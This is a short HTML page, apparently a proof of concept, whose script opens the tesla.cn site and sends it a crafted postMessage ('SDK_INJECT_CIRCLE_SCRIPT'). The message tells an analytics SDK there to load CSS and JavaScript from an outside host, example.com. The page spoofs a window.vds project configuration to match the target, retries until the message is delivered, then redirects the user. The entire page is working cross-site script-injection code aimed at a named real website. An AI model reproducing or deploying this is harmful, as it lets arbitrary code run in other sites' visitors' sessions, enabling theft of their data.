<!DOCTYPE html>
<html>
<head>
    <title>A网站（终极解决方案）</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>A网站（解决source为null问题）</h1>
    <button id="triggerBtn">发送消息并跳转</button>

    <script>
        const B_ORIGIN = 'https://www.tesla.cn'; // 替换为实际B网站域名
        let bWindow = null;

        // 关键1：提前定义并冻结vds对象，确保属性不可变
        window.vds = Object.freeze({
            projectId: "123456",    // 必须和B的vds.projectId完全一致
            dataSourceId: "abcdef"  // 必须和B的vds.dataSourceId完全一致
        });

        document.getElementById('triggerBtn').addEventListener('click', () => {
            // 打开旧B窗口
            bWindow = window.open(`${B_ORIGIN}`, '_blank');
            
            // 关键2：同步等待B窗口加载完成，确保监听函数已注册
            const sendMessageImmediately = () => {
                if (bWindow && !bWindow.closed) {
                    try {
                        // 先发送ping消息验证通信通道是否可用
                        bWindow.postMessage({ type: 'ping' }, B_ORIGIN);
                        
                        // 立即发送业务消息，同步执行
                         bWindow.postMessage({
                        type: "SDK_INJECT_CIRCLE_SCRIPT",
                        cssURL:"https://www.example.com/1.css",
                        jsURL:"https://www.example.com/1.js"
                    }, B_ORIGIN); // 这里必须是B的完整域名，不能用'*'
                        
                        console.log('消息已发送，延迟50ms跳转确保B处理完成');
                        
                        // 关键3：极短延迟跳转，给B足够时间处理message事件
                        // 50ms远小于浏览器销毁页面上下文的时间，完全不影响用户体验
                        setTimeout(() => {
                            window.location.href = `${B_ORIGIN}`;
                        }, 50);
                        
                    } catch (e) {
                        // B窗口还在加载，重试
                        setTimeout(sendMessageImmediately, 30);
                    }
                }
            };
            sendMessageImmediately();
        });
    </script>
</body>
</html>
